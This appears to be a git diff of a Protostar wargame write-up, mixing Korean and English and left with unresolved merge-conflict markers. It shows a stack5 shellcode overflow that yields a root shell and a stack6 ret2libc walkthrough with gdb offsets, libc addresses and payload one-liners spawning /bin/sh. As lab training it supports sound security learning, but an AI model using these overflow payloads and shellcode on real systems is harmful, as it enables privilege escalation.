@@ -1,6 +1,13 @@
+<<<<<<< HEAD
+### 설치 방법
+  
+> * protostar vm on parallels
+> * root/godmod and ifconfig
+=======
 ## Wargame/Protostar
 
 ## VM Configuration
+>>>>>>> 395bbcff115b2d8e185bfc323c9ef149ab077038
 
 - protostar vm (parallels, vmware, vmplayer, ...)
 - Login as admin id `root/godmod` and check IP using `ifconfig`
@@ -296,4 +303,134 @@ ebp            0xbffff798 0xbffff798
 user@protostar:/opt/protostar/bin$ (python -c 'print "A"*76+"\xc0\xf7\xff\xbf"+"\x90"*16+"\xdb\xc8\xd9\x74\x24\xf4\xba\x2a\xa1\xa4\x48\x5d\x29\xc9\xb1\x10\x31\x55\x17\x83\xed\xfc\x03\x7f\xb2\x46\xbd\x4e\x7d\xb7\xe5\x47\x9e\x08\xbd\x6a\xe1\x03\xb5\x2c\x7b\x81\xaf\xa4\x56\x45\xb9\xd3\xc1\xa6\xca\x73\x12\xd1\x03\xe1\x7b\x4f\xd5\x06\x29\x67\xed\xc8\xce\x77\xc1\xaa\xa7\x19\x32\x59\x50\xe6\x1b\xce\x29\x07\x6e\x70\x18\x13\x1b\x71\x03\x6e\x5c"';cat)|./stack5
 id
 uid=0(root) gid=1001(user) groups=0(root),1001(user)
+```
+
+
+### Stack6
+
+> /opt/protostar/bin/stack6
+
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void getpath()
+{
+  char buffer[64];
+  unsigned int ret;
+
+  printf("input path please: "); fflush(stdout);
+
+  gets(buffer);
+
+  ret = __builtin_return_address(0);
+
+  if((ret & 0xbf000000) == 0xbf000000) {
+      printf("bzzzt (%p)\n", ret);
+      _exit(1);
+  }
+
+  printf("got path %s\n", buffer);
+}
+
+int main(int argc, char **argv)
+{
+  getpath();
+}
+```
+
+알아야하는 것 : *gdb*, *ROP*
+
+```
+gef➤  ni
+input path please: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
+$eax   : 0x000000d2
+$ebx   : 0xf7fbb000  →  0x001a8da8
+$ecx   : 0x00000000
+$edx   : 0xf7fbc898  →  0x00000000
+$esp   : 0xffffcf50  →  "Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae[...]"
+$ebp   : 0x63413563 ("c5Ac"?)
+$esi   : 0x00000000
+$edi   : 0x00000000
+$eip   : 0x37634136 ("6Ac7"?)
+
+$ python pattern.py 6Ac7
+Pattern 6Ac7 first occurrence at position 80 in pattern.
+```
+
+```
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
+(gdb) print exit
+$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
+```
+
+```
+$ export GETME=/usr/bin/whoami
+
+$ env
+SSH_CLIENT=10.211.55.2 60205 22
+USER=user
+MAIL=/var/mail/user
+OLDPWD=/home/user
+HOME=/home/user
+SSH_TTY=/dev/pts/0
+LC_CTYPE=UTF-8
+LOGNAME=user
+TERM=xterm-256color
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+GETME=/usr/bin/whoami
+LANG=en_US.UTF-8
+SHELL=/bin/sh
+PWD=/opt/protostar/bin
+SSH_CONNECTION=10.211.55.2 60205 10.211.55.5 22
+
+(gdb) x/10s 0xbfffff50
+0xbfffff50:  "s:/usr/games"
+0xbfffff5d:  "LANG=en_US.UTF-8"
+0xbfffff6e:  "GETME=/usr/bin/whoami"
+0xbfffff84:  "SHELL=/bin/sh"
+0xbfffff92:  "PWD=/opt/protostar/bin"
+0xbfffffa9:  "SSH_CONNECTION=10.211.55.2 60205 10.211.55.5 22"
+0xbfffffd9:  "LINES=42"
+0xbfffffe2:  "/opt/protostar/bin/stack6"
+0xbffffffc:  ""
+0xbffffffd:  ""
+
+$ (python -c 'print "A"*80+"\xb0\xff\xec\xb7"+"\xc0\x60\xec\xb7"+"\x7d\xff\xff\xbf"';cat)|./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`�}���
+root
+```
+
+```
+$ export GETME=/bin/sh
+
+$ env
+SSH_CLIENT=10.211.55.2 60205 22
+USER=user
+MAIL=/var/mail/user
+OLDPWD=/home/user
+HOME=/home/user
+SSH_TTY=/dev/pts/0
+LC_CTYPE=UTF-8
+LOGNAME=user
+TERM=xterm-256color
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+GETME=/bin/sh
+LANG=en_US.UTF-8
+SHELL=/bin/sh
+PWD=/opt/protostar/bin
+
+$ (python -c 'print "A"*80+"\xb0\xff\xec\xb7"+"\xc0\x60\xec\xb7"+"\x85\xff\xff\xbf"';cat)|./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`췅���
+id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+
 ```
